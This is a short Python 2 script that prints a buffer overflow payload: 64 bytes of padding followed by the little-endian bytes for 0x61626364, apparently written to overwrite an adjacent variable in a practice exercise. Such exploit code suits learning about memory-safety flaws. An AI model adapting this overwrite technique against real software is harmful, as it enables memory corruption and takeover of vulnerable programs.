#!/usr/bin/env python2.6

buff = "AAABBBCCCDDDEEEFFFGGGHHHIIIJJJKKKLLLMMMNNNOOOPPPQQQRRRSSSTTTUUUVVVVWWWXXXYYYZZZ111222333444555666777888999000"

value = '\x64\x63\x62\x61'

print buff[:64] + "%s" % value
